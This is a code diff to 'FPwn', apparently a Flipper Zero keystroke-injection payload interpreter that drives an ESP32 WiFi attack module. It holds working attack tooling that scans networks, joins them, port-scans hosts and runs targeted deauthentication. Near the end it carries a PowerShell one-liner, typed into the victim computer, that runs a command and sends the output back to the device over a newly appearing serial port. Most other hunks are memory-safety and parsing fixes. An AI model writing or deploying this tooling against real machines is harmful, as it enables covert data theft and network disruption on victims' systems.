@@ -27,11 +27,6 @@
 
 #define TAG "FPwn"
 
-typedef enum {
-    CdcStateDisconnected,
-    CdcStateConnected,
-} CdcState;
-
 /* =========================================================================
  * USB CDC exfiltration — ISR-safe flags for the rx_ep_callback
  * ========================================================================= */
@@ -427,7 +422,7 @@ static uint16_t fpwn_named_key(const char* name) {
     if(name[0] != '\0' && name[1] == '\0') {
         uint16_t kc;
         bool shift;
-        if(fpwn_char_to_hid(name[0], &kc, &shift)) return kc;
+        if(fpwn_char_to_hid(name[0], &kc, &shift)) return shift ? (KEY_MOD_LEFT_SHIFT | kc) : kc;
     }
     /* Named keys */
     if(strcmp(name, "ENTER") == 0 || strcmp(name, "RETURN") == 0) return HID_KEYBOARD_RETURN;
@@ -562,7 +557,7 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
 
     /* ---- DEFAULTDELAY / DEFAULT_DELAY ---- */
     if(strncmp(line, "DEFAULTDELAY ", 13) == 0 || strncmp(line, "DEFAULT_DELAY ", 14) == 0) {
-        const char* val = (line[7] == 'D') ? line + 14 : line + 13;
+        const char* val = (line[7] == '_') ? line + 14 : line + 13;
         s_default_delay_ms = (uint32_t)atoi(val);
         return;
     }
@@ -635,9 +630,13 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
                     case '-':
                         result = lhs - rhs;
                         break;
-                    case '*':
-                        result = lhs * rhs;
+                    case '*': {
+                        int64_t wide = (int64_t)lhs * (int64_t)rhs;
+                        if(wide > INT32_MAX) wide = INT32_MAX;
+                        if(wide < INT32_MIN) wide = INT32_MIN;
+                        result = (int32_t)wide;
                         break;
+                    }
                     case '/':
                         result = (rhs != 0) ? lhs / rhs : 0;
                         break;
@@ -945,10 +944,11 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
             delay_buf[dlen] = '\0';
             uint32_t char_delay = (uint32_t)atoi(delay_buf);
             const char* text = space + 1;
-            while(*text) {
-                fpwn_type_char(*text);
+            char sd_expanded[FPWN_MAX_LINE_LEN];
+            fpwn_var_substitute(text, sd_expanded, sizeof(sd_expanded));
+            for(const char* ch = sd_expanded; *ch; ch++) {
+                fpwn_type_char(*ch);
                 if(char_delay > 0) furi_delay_ms(char_delay);
-                text++;
             }
         }
         return;
@@ -1464,25 +1464,31 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         File* sf = storage_file_alloc(app->storage);
         if(storage_file_open(sf, save_path, FSAM_WRITE, FSOM_CREATE_NEW)) {
             char buf[160];
-            uint32_t ac = 0;
-            FPwnWifiAP* aps = fpwn_marauder_get_aps(app->marauder, &ac);
-            for(uint32_t i = 0; i < ac; i++) {
-                int n = snprintf(
-                    buf,
-                    sizeof(buf),
-                    "%s %s %ddBm CH%u\n",
-                    aps[i].ssid,
-                    aps[i].bssid,
-                    (int)aps[i].rssi,
-                    (unsigned)aps[i].channel);
-                if(n > 0 && n < (int)sizeof(buf)) storage_file_write(sf, buf, (uint16_t)n);
+            FPwnWifiAP* aps = malloc(FPWN_MAX_APS * sizeof(FPwnWifiAP));
+            if(aps) {
+                uint32_t ac = fpwn_marauder_copy_aps(app->marauder, aps, FPWN_MAX_APS);
+                for(uint32_t i = 0; i < ac; i++) {
+                    int n = snprintf(
+                        buf,
+                        sizeof(buf),
+                        "%s %s %ddBm CH%u\n",
+                        aps[i].ssid,
+                        aps[i].bssid,
+                        (int)aps[i].rssi,
+                        (unsigned)aps[i].channel);
+                    if(n > 0 && n < (int)sizeof(buf)) storage_file_write(sf, buf, (uint16_t)n);
+                }
+                free(aps);
             }
-            uint32_t hc = 0;
-            FPwnNetHost* hosts = fpwn_marauder_get_hosts(app->marauder, &hc);
-            for(uint32_t i = 0; i < hc; i++) {
-                if(!hosts[i].alive) continue;
-                int n = snprintf(buf, sizeof(buf), "%s alive\n", hosts[i].ip);
-                if(n > 0 && n < (int)sizeof(buf)) storage_file_write(sf, buf, (uint16_t)n);
+            FPwnNetHost* hosts = malloc(FPWN_MAX_HOSTS * sizeof(FPwnNetHost));
+            if(hosts) {
+                uint32_t hc = fpwn_marauder_copy_hosts(app->marauder, hosts, FPWN_MAX_HOSTS);
+                for(uint32_t i = 0; i < hc; i++) {
+                    if(!hosts[i].alive) continue;
+                    int n = snprintf(buf, sizeof(buf), "%s alive\n", hosts[i].ip);
+                    if(n > 0 && n < (int)sizeof(buf)) storage_file_write(sf, buf, (uint16_t)n);
+                }
+                free(hosts);
             }
             storage_file_close(sf);
             FURI_LOG_I(TAG, "SAVE_WIFI: saved to %s", save_path);
@@ -1618,47 +1624,92 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
             return;
         }
         fpwn_marauder_scan_ap(app->marauder);
-        /* Wait up to 10 seconds for scan results */
-        for(int i = 0; i < 100; i++) {
+        /* Active scan phase — 8 seconds of streaming AP collection */
+        for(int i = 0; i < 80 && !app->abort_requested; i++) {
+            furi_delay_ms(100);
+        }
+        /* Send stopscan + schedule deferred 'list -a' */
+        fpwn_marauder_stop_scan(app->marauder);
+        /* Wait for 'list -a' response and state → Idle (up to 5 seconds) */
+        for(int i = 0; i < 50 && !app->abort_requested; i++) {
             furi_delay_ms(100);
             if(fpwn_marauder_get_state(app->marauder) == FPwnMarauderStateIdle) break;
         }
-        fpwn_marauder_stop_scan(app->marauder);
         return;
     }
 
-    /* WIFI_JOIN <SSID> <PASSWORD> */
+    /* WIFI_JOIN <SSID> <PASSWORD>  or  WIFI_JOIN "<SSID with spaces>" <PASSWORD> */
     if(strncmp(line, "WIFI_JOIN ", 10) == 0) {
         if(!app->marauder || !app->wifi_uart || !fpwn_wifi_uart_is_connected(app->wifi_uart)) {
             FURI_LOG_W(TAG, "WIFI_JOIN: ESP32 not connected, skipping");
             return;
         }
         const char* args = line + 10;
-        /* Parse SSID (first token) and password (remainder after first space) */
-        const char* space = strchr(args, ' ');
+        /* Parse SSID and password. Supports quoted SSID for names with spaces:
+         *   WIFI_JOIN "My Network" password123
+         *   WIFI_JOIN SimpleSSID password123 */
         char ssid[33];
         char password[64];
-        if(space) {
-            size_t ssid_len = (size_t)(space - args);
-            if(ssid_len > 32) ssid_len = 32;
-            memcpy(ssid, args, ssid_len);
-            ssid[ssid_len] = '\0';
-            strncpy(password, space + 1, sizeof(password) - 1);
+        const char* pw_start = NULL;
+        if(args[0] == '"') {
+            const char* close_quote = strchr(args + 1, '"');
+            if(close_quote) {
+                size_t ssid_len = (size_t)(close_quote - (args + 1));
+                if(ssid_len > 32) ssid_len = 32;
+                memcpy(ssid, args + 1, ssid_len);
+                ssid[ssid_len] = '\0';
+                pw_start = close_quote + 1;
+                while(*pw_start == ' ')
+                    pw_start++;
+            } else {
+                strncpy(ssid, args + 1, sizeof(ssid) - 1);
+                ssid[sizeof(ssid) - 1] = '\0';
+                pw_start = NULL;
+            }
+        } else {
+            const char* space = strchr(args, ' ');
+            if(space) {
+                size_t ssid_len = (size_t)(space - args);
+                if(ssid_len > 32) ssid_len = 32;
+                memcpy(ssid, args, ssid_len);
+                ssid[ssid_len] = '\0';
+                pw_start = space + 1;
+            } else {
+                strncpy(ssid, args, sizeof(ssid) - 1);
+                ssid[sizeof(ssid) - 1] = '\0';
+                pw_start = NULL;
+            }
+        }
+        if(pw_start && *pw_start) {
+            strncpy(password, pw_start, sizeof(password) - 1);
             password[sizeof(password) - 1] = '\0';
         } else {
-            strncpy(ssid, args, sizeof(ssid) - 1);
-            ssid[sizeof(ssid) - 1] = '\0';
             password[0] = '\0';
         }
-        /* Find matching AP index in scan results; default to 0 if not found */
-        uint32_t ap_count = 0;
-        FPwnWifiAP* aps = fpwn_marauder_get_aps(app->marauder, &ap_count);
+        /* Find matching AP index in scan results */
+        FPwnWifiAP* aps = malloc(FPWN_MAX_APS * sizeof(FPwnWifiAP));
+        if(!aps) {
+            FURI_LOG_E(TAG, "WIFI_JOIN: malloc failed");
+            return;
+        }
+        uint32_t ap_count = fpwn_marauder_copy_aps(app->marauder, aps, FPWN_MAX_APS);
+        bool found = false;
         uint8_t ap_idx = 0;
         for(uint32_t i = 0; i < ap_count; i++) {
             if(strcmp(aps[i].ssid, ssid) == 0) {
                 ap_idx = (uint8_t)i;
+                found = true;
                 break;
             }
+        }
+        free(aps);
+        if(!found) {
+            FURI_LOG_W(
+                TAG,
+                "WIFI_JOIN: SSID '%s' not in scan results (%lu APs), skipping",
+                ssid,
+                (unsigned long)ap_count);
+            return;
         }
         fpwn_marauder_join(app->marauder, ap_idx, password);
         furi_delay_ms(3000); /* Wait for association */
@@ -1698,14 +1749,17 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         }
         const char* target = line + 10;
         /* Find host index by IP; default to 0 if not found */
-        uint32_t host_count = 0;
-        FPwnNetHost* hosts = fpwn_marauder_get_hosts(app->marauder, &host_count);
         uint8_t host_idx = 0;
-        for(uint32_t i = 0; i < host_count; i++) {
-            if(strcmp(hosts[i].ip, target) == 0) {
-                host_idx = (uint8_t)i;
-                break;
+        FPwnNetHost* hosts = malloc(FPWN_MAX_HOSTS * sizeof(FPwnNetHost));
+        if(hosts) {
+            uint32_t host_count = fpwn_marauder_copy_hosts(app->marauder, hosts, FPWN_MAX_HOSTS);
+            for(uint32_t i = 0; i < host_count; i++) {
+                if(strcmp(hosts[i].ip, target) == 0) {
+                    host_idx = (uint8_t)i;
+                    break;
+                }
             }
+            free(hosts);
         }
         fpwn_marauder_port_scan(app->marauder, host_idx, false);
         /* Wait up to 60 seconds */
@@ -1723,47 +1777,56 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
             return;
         }
         /* Type AP results */
-        uint32_t ap_count = 0;
-        FPwnWifiAP* aps = fpwn_marauder_get_aps(app->marauder, &ap_count);
-        for(uint32_t i = 0; i < ap_count; i++) {
-            char buf[128];
-            snprintf(
-                buf,
-                sizeof(buf),
-                "%s  %s  %ddBm  CH%u",
-                aps[i].ssid,
-                aps[i].bssid,
-                (int)aps[i].rssi,
-                (unsigned)aps[i].channel);
-            fpwn_type_string(buf);
-            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
-            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
-            furi_delay_ms(5);
+        FPwnWifiAP* aps = malloc(FPWN_MAX_APS * sizeof(FPwnWifiAP));
+        if(aps) {
+            uint32_t ap_count = fpwn_marauder_copy_aps(app->marauder, aps, FPWN_MAX_APS);
+            for(uint32_t i = 0; i < ap_count; i++) {
+                char buf[128];
+                snprintf(
+                    buf,
+                    sizeof(buf),
+                    "%s  %s  %ddBm  CH%u",
+                    aps[i].ssid,
+                    aps[i].bssid,
+                    (int)aps[i].rssi,
+                    (unsigned)aps[i].channel);
+                fpwn_type_string(buf);
+                furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+                furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+                furi_delay_ms(5);
+            }
+            free(aps);
         }
         /* Type host results */
-        uint32_t host_count = 0;
-        FPwnNetHost* hosts = fpwn_marauder_get_hosts(app->marauder, &host_count);
-        for(uint32_t i = 0; i < host_count; i++) {
-            if(!hosts[i].alive) continue;
-            char buf[32];
-            snprintf(buf, sizeof(buf), "%s alive", hosts[i].ip);
-            fpwn_type_string(buf);
-            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
-            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
-            furi_delay_ms(5);
+        FPwnNetHost* hosts = malloc(FPWN_MAX_HOSTS * sizeof(FPwnNetHost));
+        if(hosts) {
+            uint32_t host_count = fpwn_marauder_copy_hosts(app->marauder, hosts, FPWN_MAX_HOSTS);
+            for(uint32_t i = 0; i < host_count; i++) {
+                if(!hosts[i].alive) continue;
+                char buf[32];
+                snprintf(buf, sizeof(buf), "%s alive", hosts[i].ip);
+                fpwn_type_string(buf);
+                furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+                furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+                furi_delay_ms(5);
+            }
+            free(hosts);
         }
         /* Type port results */
-        uint32_t port_count = 0;
-        FPwnPortResult* ports = fpwn_marauder_get_ports(app->marauder, &port_count);
-        for(uint32_t i = 0; i < port_count; i++) {
-            if(!ports[i].open) continue;
-            char buf[48];
-            snprintf(
-                buf, sizeof(buf), "%u/tcp open %s", (unsigned)ports[i].port, ports[i].service);
-            fpwn_type_string(buf);
-            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
-            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
-            furi_delay_ms(5);
+        FPwnPortResult* ports = malloc(FPWN_MAX_PORTS * sizeof(FPwnPortResult));
+        if(ports) {
+            uint32_t port_count = fpwn_marauder_copy_ports(app->marauder, ports, FPWN_MAX_PORTS);
+            for(uint32_t i = 0; i < port_count; i++) {
+                if(!ports[i].open) continue;
+                char buf[48];
+                snprintf(
+                    buf, sizeof(buf), "%u/tcp open %s", (unsigned)ports[i].port, ports[i].service);
+                fpwn_type_string(buf);
+                furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+                furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+                furi_delay_ms(5);
+            }
+            free(ports);
         }
         return;
     }
@@ -1789,14 +1852,18 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
             return;
         }
         const char* target_ssid = line + 19;
-        uint32_t ap_count = 0;
-        FPwnWifiAP* aps = fpwn_marauder_get_aps(app->marauder, &ap_count);
-        for(uint32_t i = 0; i < ap_count; i++) {
-            if(strcmp(aps[i].ssid, target_ssid) == 0) {
-                fpwn_marauder_deauth_targeted(app->marauder, (uint8_t)i);
-                FURI_LOG_I(TAG, "Deauth target: %s (idx %lu)", target_ssid, (unsigned long)i);
-                return;
+        FPwnWifiAP* aps = malloc(FPWN_MAX_APS * sizeof(FPwnWifiAP));
+        if(aps) {
+            uint32_t ap_count = fpwn_marauder_copy_aps(app->marauder, aps, FPWN_MAX_APS);
+            for(uint32_t i = 0; i < ap_count; i++) {
+                if(strcmp(aps[i].ssid, target_ssid) == 0) {
+                    free(aps);
+                    fpwn_marauder_deauth_targeted(app->marauder, (uint8_t)i);
+                    FURI_LOG_I(TAG, "Deauth target: %s (idx %lu)", target_ssid, (unsigned long)i);
+                    return;
+                }
             }
+            free(aps);
         }
         FURI_LOG_W(TAG, "WIFI_DEAUTH_TARGET: SSID '%s' not found", target_ssid);
         return;
@@ -1889,16 +1956,25 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
             FURI_LOG_W(TAG, "WIFI_STA_RESULT: no marauder, skipping");
             return;
         }
-        uint32_t sta_count = 0;
-        FPwnStation* stas = fpwn_marauder_get_stations(app->marauder, &sta_count);
-        for(uint32_t i = 0; i < sta_count; i++) {
-            char buf[96];
-            snprintf(
-                buf, sizeof(buf), "%s  %ddBm  %s", stas[i].mac, (int)stas[i].rssi, stas[i].ap_ssid);
-            fpwn_type_string(buf);
-            furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
-            furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
-            furi_delay_ms(5);
+        FPwnStation* stas = malloc(FPWN_MAX_STATIONS * sizeof(FPwnStation));
+        if(stas) {
+            uint32_t sta_count =
+                fpwn_marauder_copy_stations(app->marauder, stas, FPWN_MAX_STATIONS);
+            for(uint32_t i = 0; i < sta_count; i++) {
+                char buf[96];
+                snprintf(
+                    buf,
+                    sizeof(buf),
+                    "%s  %ddBm  %s",
+                    stas[i].mac,
+                    (int)stas[i].rssi,
+                    stas[i].ap_ssid);
+                fpwn_type_string(buf);
+                furi_hal_hid_kb_press(HID_KEYBOARD_RETURN);
+                furi_hal_hid_kb_release(HID_KEYBOARD_RETURN);
+                furi_delay_ms(5);
+            }
+            free(stas);
         }
         return;
     }
@@ -2066,7 +2142,7 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
 
             File* ef = storage_file_alloc(app->storage);
             if(storage_file_open(ef, exfil_path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
-                storage_file_write(ef, app->exfil_buffer, (uint16_t)app->exfil_len);
+                storage_file_write(ef, app->exfil_buffer, app->exfil_len);
                 storage_file_close(ef);
                 FURI_LOG_I(
                     TAG, "EXFIL: saved %lu bytes to %s", (unsigned long)app->exfil_len, exfil_path);
@@ -2135,16 +2211,17 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
             fpwn_type_string("$_t=[IO.Ports.SerialPort]; "
                              "$_d=(");
             fpwn_type_string(cmd);
-            fpwn_type_string(")|Out-String; "
-                             "$_p=$_t::GetPortNames(); "
-                             "1..40|%{sleep -m 500; "
-                             "$_n=$_t::GetPortNames()|?{$_ -notin $_p}; "
-                             "if($_n){"
-                             "$_s=$_t::new($_n[0],115200); "
-                             "$_s.Open(); "
-                             "[byte[]]$_b=[Text.Encoding]::ASCII.GetBytes($_d+[char]4); "
-                             "$_s.Write($_b,0,$_b.Length); "
-                             "$_s.Close(); break}}");
+            fpwn_type_string(
+                ")|Out-String; "
+                "$_p=$_t::GetPortNames()|?{$_ -match '^COM\\d+$'}; "
+                "1..40|%{sleep -m 500; "
+                "$_n=$_t::GetPortNames()|?{$_ -match '^COM\\d+$' -and $_ -notin $_p}; "
+                "if($_n){"
+                "$_s=$_t::new($_n[0],115200); "
+                "$_s.Open(); "
+                "[byte[]]$_b=[Text.Encoding]::ASCII.GetBytes($_d+[char]4); "
+                "$_s.Write($_b,0,$_b.Length); "
+                "$_s.Close(); break}}");
         } else if(os == FPwnOSLinux) {
             /* Bash: capture output, snapshot /dev/ttyACM*, poll for new device,
              * configure with stty, write data + EOT. */
@@ -2311,7 +2388,7 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
 
             File* ef = storage_file_alloc(app->storage);
             if(storage_file_open(ef, exfil_path, FSAM_WRITE, FSOM_CREATE_ALWAYS)) {
-                storage_file_write(ef, app->exfil_buffer, (uint16_t)app->exfil_len);
+                storage_file_write(ef, app->exfil_buffer, app->exfil_len);
                 storage_file_close(ef);
                 FURI_LOG_I(
                     TAG,
@@ -2772,6 +2849,7 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
 
     /* Reset per-run state so previous payload's state doesn't bleed in */
     s_default_delay_ms = 0;
+    s_last_command[0] = '\0';
     s_var_count = 0;
     s_inject_depth = 0;
     memset(s_vars, 0, sizeof(s_vars));
@@ -2949,7 +3027,7 @@ int32_t fpwn_payload_execute_thread(void* ctx) {
                     size_t sn = fpwn_read_line(file, raw, sizeof(raw));
                     if(sn == 0) break; /* EOF or I/O error — stop skipping */
                     char* st = fpwn_trim(raw);
-                    if(strcmp(st, "IF_CONNECTED") == 0)
+                    if(strcmp(st, "IF_CONNECTED") == 0 || strncmp(st, "IF ", 3) == 0)
                         depth++;
                     else if(strcmp(st, "END_IF") == 0)
                         depth--;
